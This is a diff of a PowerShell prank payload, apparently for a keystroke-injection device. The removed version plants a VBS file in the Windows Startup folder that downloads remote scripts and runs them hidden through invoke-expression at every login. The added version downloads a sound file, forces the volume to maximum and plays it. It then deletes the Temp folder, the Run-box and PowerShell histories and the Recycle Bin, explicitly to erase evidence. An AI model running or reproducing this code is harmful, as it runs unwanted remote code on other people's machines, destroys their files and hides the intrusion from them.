@@ -1,6 +1,53 @@
-Start-Sleep -Seconds 1
-cd 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\'
-New-Item 'SYSTEM.vbs' -ItemType File
-Start-Sleep -Seconds 1
-$content = 'Set objShell = CreateObject("WScript.Shell"):objShell.Run("powershell.exe $pl = iwr https://raw.githubusercontent.com/Hackstur/JokerShell/master/System/RickRoll-Powershell.ps1; invoke-expression $pl"):objShell.Run("powershell.exe -w h $pl = iwr https://raw.githubusercontent.com/Falconnix/prank/main/Volume.ps1; invoke-expression $pl"):objShell.Run("powershell.exe -w h  $BeepList = @(@{ Pitch = 32767; Length = 900000; };);foreach ($Beep in $BeepList) {[System.Console]::Beep($Beep[''Pitch''], $Beep[''Length'']);}")' | out-file -filepath SYSTEM.vbs
-$o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds 2
+iwr https://github.com/Falconnix/prank/raw/main/sound.wav -O $env:TMP\e.wav
+
+############################################################################################################################################################
+
+# This turns the volume up to max level
+$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
+
+############################################################################################################################################################
+
+# This while loop will constantly check if the mouse has been moved 
+# if the mouse has not moved "SCROLLLOCK" will be pressed to prevent screen from turning off
+# it will then sleep for the indicated number of seconds and check again
+
+Add-Type -AssemblyName System.Windows.Forms
+$originalPOS = [System.Windows.Forms.Cursor]::Position.X
+
+    while (1) {
+        $pauseTime = 3
+        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
+            break
+        }
+        else {
+            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+        }
+    }
+############################################################################################################################################################
+
+# Play Sound 
+$PlayWav=New-Object System.Media.SoundPlayer;$PlayWav.SoundLocation="$env:TMP\e.wav";$PlayWav.playsync()
+
+############################################################################################################################################################
+
+<#
+
+.NOTES 
+	This is to clean up behind you and remove any evidence to prove you were there
+#>
+
+# Delete contents of Temp folder 
+
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# Delete run box history
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+# Deletes contents of recycle bin
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
